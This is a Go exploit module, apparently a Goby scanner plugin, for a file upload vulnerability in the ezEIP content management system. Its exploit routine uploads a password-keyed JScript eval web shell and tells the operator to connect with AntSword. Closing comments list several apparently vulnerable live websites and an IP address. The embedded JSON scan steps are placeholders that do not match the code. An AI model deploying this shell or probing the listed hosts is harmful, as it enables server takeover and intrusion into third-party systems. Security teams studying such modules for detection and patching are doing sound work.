package exploits

import (
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"math/rand"
	"mime/multipart"
	"regexp"
	"strings"
)


func init() {
	expJson := `{
    "Name": "ezEIP JQueryUploadify.aspx file upload vulnerability",
    "Description": "<p>ezEIP is a website management system of Wanhu Network Technology Co., Ltd.</p><p>The ezEIP JQueryUploadify.aspx file has a front-end file upload vulnerability.</p><p> Attackers can use this vulnerability to upload malicious Trojan horses, obtain sensitive system information, and control server permissions.</p>",
    "Product": "wanhu-ezEIP",
    "Homepage": "http://www.wanhu.com.cn",
    "DisclosureDate": "2021-10-24",
    "Author": "",
    "FofaQuery": "body=\"ezEip\" && body=\"Powered By wanhu\"",
    "GobyQuery": "body=\"ezEip\" && body=\"Powered By wanhu\"",
    "Level": "3",
    "Impact": " Attackers can use this vulnerability to upload malicious Trojan horses, obtain sensitive system information, and control server permissions.",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.wanhu.com.cn\">http://www.wanhu.com.cn</a></p><p>1.Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2020-04888"
    ],
    "Is0day": false,
    "Translation": {
        "EN": {
            "Name": "ezEIP JQueryUploadify.aspx file upload vulnerability",
            "Product": "wanhu-ezEIP",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ],
            "Description": "<p>ezEIP is a website management system of Wanhu Network Technology Co., Ltd.</p><p>The ezEIP JQueryUploadify.aspx file has a front-end file upload vulnerability.</p><p> Attackers can use this vulnerability to upload malicious Trojan horses, obtain sensitive system information, and control server permissions.</p>",
            "Impact": " Attackers can use this vulnerability to upload malicious Trojan horses, obtain sensitive system information, and control server permissions.",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.wanhu.com.cn\" target=\"_blank\">http://www.wanhu.com.cn</a></p><p>1.Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system."
        }
    },
    "HasExp": true,
    "ExpParams": [
        {
            "name": "password",
            "type": "input",
            "value": "vulgo"
        },
        {
            "name": "AttackType",
            "type": "select",
            "value": "GetShell",
            "show": ""
        }
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2020-04888"
    ],
    "CVSSScore": "8.5",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10213"
}`

postinfoe165421 := func(filebuf *bytes.Buffer, params map[string]string, fieldname string, filename string) (*bytes.Buffer, string) {
		bodyBuf := &bytes.Buffer{}
		bodyWriter := multipart.NewWriter(bodyBuf)

		fileWriter, err := bodyWriter.CreateFormFile(fieldname, filename)
		if err != nil {
			fmt.Println("error writing to buffer")
		}

		_, err = io.Copy(fileWriter, filebuf)

		if params != nil {
			for key, val := range params {
				_ = bodyWriter.WriteField(key, val)
			}
		}

		if err != nil {
			fmt.Println("copy file error")
		}

		contentType := bodyWriter.FormDataContentType()
		bodyWriter.Close()

		return bodyBuf, contentType
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/ajax/fileupload/JQueryUploadify.aspx"
			r1 := rand.Intn(7999999) + 150000

			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
				if resp.StatusCode == 200 {
					shell := `<%@Page Language="C#"%><%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));System.IO.File.Delete(Request.PhysicalPath);%>`
					payload := bytes.NewBufferString(shell)
					extraParams := map[string]string{
						"folder":   "/",
						"savePath": "/uploadfiles",
					}
					fieldname := "Filedata"
					filename := fmt.Sprintf("%d.aspx", r1)
					//filename = "e165421110ba03099a1c0393373c5b43.aspx"
					pinfo, ctype := postinfoe165421(payload, extraParams, fieldname, filename)
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.Header.Store("Content-Type", ctype)
					cfg.VerifyTls = false
					cfg.FollowRedirect = true
					cfg.Data = pinfo.String()
					if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ".aspx") {
							regexp := regexp.MustCompile(`(\d+.aspx)`)
							url := regexp.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
							shell_url := fmt.Sprintf(`/uploadfiles/%s`, url)
							if resp, err := httpclient.SimpleGet(u.FixedHostInfo + shell_url); err == nil {
								return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
							}
						}

					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			r1 := rand.Intn(7999999) + 150000
			uri := "/ajax/fileupload/JQueryUploadify.aspx"
			pass := ss.Params["password"].(string)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			// c# 一句话
			shellCode := `<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["`+pass+`"],"unsafe"));%>`
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					payload := bytes.NewBufferString(shellCode)
					extraParams := map[string]string{
						"folder":   "/",
						"savePath": "/uploadfiles",
					}
					fieldname := "Filedata"
					filename := fmt.Sprintf("%d.aspx", r1)
					pinfo, ctype := postinfoe165421(payload, extraParams, fieldname, filename)
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.Header.Store("Content-Type", ctype)
					cfg.VerifyTls = false
					cfg.FollowRedirect = true
					cfg.Data = pinfo.String()
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ".aspx") {
							regexp := regexp.MustCompile(`(\d+.aspx)`)
							url := regexp.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
							shell_url := fmt.Sprintf(`%s/uploadfiles/%s`, expResult.HostInfo.FixedHostInfo, url)
							if resp, err := httpclient.SimpleGet(shell_url); err == nil {
								if resp.StatusCode == 200 {
									expResult.Success = true
									shellinfo := fmt.Sprintf("url: %s, pass:%s", shell_url,pass)
									expResult.Output = shellinfo
									expResult.Output += "\n\n"
									expResult.Output += "use antsword to connect it."
								}

							}
						}

					}

				}
			}
			return expResult
		},
	))
}

//http://www.demxs.com
//http://www.fangyuanfh.com
//https://www.evergreentyre.com
//http://112.31.10.16:8080

// rate: 2%